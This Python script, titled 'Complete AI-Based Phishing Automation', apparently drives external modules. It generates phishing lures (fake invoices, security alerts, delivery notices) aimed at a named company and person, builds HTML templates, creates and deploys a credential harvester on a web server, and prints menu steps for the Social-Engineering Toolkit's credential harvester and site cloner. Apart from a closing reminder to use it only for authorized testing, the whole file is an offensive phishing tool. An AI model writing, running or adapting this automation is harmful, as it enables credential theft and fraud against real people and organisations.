#!/usr/bin/env python3
import os
import sys
import subprocess
import time

def run_command(command, description):
    """Run a command and handle errors"""
    print(f"\n[INFO] {description}")
    try:
        result = subprocess.run(command, shell=True, check=True, 
                              capture_output=True, text=True)
        if result.stdout:
            print(result.stdout)
        return True
    except subprocess.CalledProcessError as e:
        print(f"[ERROR] {description} failed: {e}")
        if e.stderr:
            print(f"Error details: {e.stderr}")
        return False

def main():
    print("Complete AI-Based Phishing Automation")
    print("=" * 50)
    
    # Step 1: Generate AI content
    print("\nStep 1: Generating AI-based phishing content...")
    
    # Create automated content generation
    prompt_types = ["urgent_security", "invoice_scam", "social_media", "package_delivery"]
    
    print("Available prompt types:")
    for i, ptype in enumerate(prompt_types, 1):
        print(f"{i}. {ptype}")
    
    choice = input("\nSelect prompt type (1-4): ").strip()
    
    try:
        selected_type = prompt_types[int(choice) - 1]
    except (ValueError, IndexError):
        print("Invalid choice!")
        return
    
    target_company = input("Enter target company: ").strip() or "TechCorp"
    target_name = input("Enter target name: ").strip() or "User"
    
    # Generate content automatically
    content_script = f"""
from ai_phishing_generator import PhishingContentGenerator
from datetime import datetime

generator = PhishingContentGenerator()
content = generator.generate_content('{selected_type}', '{target_company}', '{target_name}')
filename = f'auto_phishing_{selected_type}_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt'
generator.save_content(content, filename)
print(f'CONTENT_FILE:{filename}')
"""
    
    with open('temp_generate.py', 'w') as f:
        f.write(content_script)
    
    result = subprocess.run(['python3', 'temp_generate.py'], 
                          capture_output=True, text=True)
    
    if result.returncode == 0:
        # Extract filename from output
        for line in result.stdout.split('\n'):
            if line.startswith('CONTENT_FILE:'):
                content_file = line.split(':', 1)[1]
                break
        else:
            print("Failed to generate content!")
            return
    else:
        print("Content generation failed!")
        return
    
    # Step 2: Create phishing templates
    print(f"\nStep 2: Creating phishing templates from {content_file}...")
    
    template_name = f"phishing_{selected_type}_{int(time.time())}"
    
    setup_script = f"""
from automated_phishing_setup import AutomatedPhishingSetup
import os

setup = AutomatedPhishingSetup()
setup.create_template_directory()

with open('{content_file}', 'r') as f:
    content = f.read()

template_path = setup.generate_html_template(content, '{template_name}')
setup.create_credential_harvester()
setup.deploy_to_webserver(template_path)
setup.create_set_config('{template_name}')
print('TEMPLATE_READY')
"""
    
    with open('temp_setup.py', 'w') as f:
        f.write(setup_script)
    
    if run_command('python3 temp_setup.py', 'Creating phishing templates'):
        print(f"\nPhishing campaign ready!")
        print(f"Template name: {template_name}")
        print(f"Web interface: http://localhost/{template_name}.html")
        
        # Step 3: Display SET integration instructions
        print("\nStep 3: SET Integration Instructions")
        print("-" * 40)
        print("To use with SET:")
        print("1. Run: sudo python3 /opt/setoolkit/setoolkit")
        print("2. Select: 1) Social-Engineering Attacks")
        print("3. Select: 2) Website Attack Vectors")
        print("4. Select: 3) Credential Harvester Attack Method")
        print("5. Select: 2) Site Cloner")
        print(f"6. Use template: {template_name}.html")
        
        # Step 4: Test the setup
        print("\nStep 4: Testing the setup...")
        if run_command('curl -s http://localhost/ > /dev/null', 'Testing web server'):
            print("Web server is running successfully!")
        
        print("\nStep 5: Cleanup temporary files...")
        for temp_file in ['temp_generate.py', 'temp_setup.py']:
            if os.path.exists(temp_file):
                os.remove(temp_file)
        
        print("\n" + "=" * 50)
        print("AUTOMATION COMPLETE!")
        print("=" * 50)
        print(f"Phishing lure generated: {content_file}")
        print(f"HTML template: {template_name}.html")
        print(f"Access URL: http://localhost/{template_name}.html")
        print("\nRemember: Use only for authorized security testing!")
    
    else:
        print("Template creation failed!")

if __name__ == "__main__":
    main()
